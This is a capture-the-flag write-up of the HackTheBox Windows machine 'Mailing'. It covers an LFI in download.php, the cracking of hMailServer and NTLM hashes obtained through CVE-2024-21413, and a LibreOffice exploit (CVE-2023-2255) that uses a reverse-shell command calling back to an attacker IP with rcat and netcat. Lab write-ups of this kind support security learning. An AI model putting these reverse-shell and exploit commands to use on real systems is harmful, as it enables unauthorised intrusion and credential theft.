---
title: Mailing
published: 2024-09-01
description: "An in-detail writeup on the windows box: Mailing. From boot to root!"
image: "./Mailing.png"
tags: ["htb", "box", "easy", "windows", "reverse-shells", "privilege-escalation", "LFI", "CVE-2024-21413"]
category: HackTheBox
draft: false
--- 

# Mailing 

* I scanned all ports, sub directories and `php` files. Also, copies of the scans are attached here. 

## Initial Access 

* I discovered some `php` files from my `ffuf` scans and one interesting one was this:

```bash
download                [Status: 200, Size: 31, Words: 5, Lines: 1, Duration: 326ms]
```

* Requesting `download.php` made me more curious:

```bash
❯ curl 'mailing.htb/download.php'
No file specified for download. 
```

* From that results I figured out that there's a param probably `file` 

* And, I was correct the param was `file` and it returned an error page:

```bash
curl 'mailing.htb/download.php?file='
---snip--- 
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>500 - Internal server error.</h2>
  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

* Of course, it was clearly LFI which I confirmed later on

* After, doing some research about `hmailserver`, I discovered some locations it's files are stored:

![](https://i.postimg.cc/PrNvYLpS/Screenshot-from-2024-05-04-21-30-33.png) 

* Passing  `AdministratorPassword` to crackstation, I got the password in clear text:

![](https://i.postimg.cc/TwLgGpV7/Screenshot-from-2024-05-04-21-33-17.png)

* After doing some recon about this I discovered a CVE on Microsoft Outlook that reveals ntlm hash: `CVE-2024-21413` 

![](https://i.postimg.cc/PJ2zSBTY/Screenshot-from-2024-05-04-21-41-03.png)

* I cracked that and got user `maya`, password `m4y4ngs4ri` 

## Privilege Escalation

* I discovered that libreoffice was outdated and found a `cve` to exploit it. Also, `C:\Important Documents` this directory was writeable. 

* [CVE](https://github.com/elweth-sec/CVE-2023-2255)

* I compile rcat for windows and put `rcat.exe` in `C:\ProgramData `

```bash
python3 CVE-2023-2255.py --cmd 'C:\ProgramData\rcat.exe connect 10.10.16.4 9999' --output 'hack.odt'
``` 

* I started a listene with netcat on attacker: `nc -lvnp 9999`. Put `hack.odt` in `C:\Important Documents` and after like 30 seconds I got a shell as `localadmin`.

## Pwned 
+
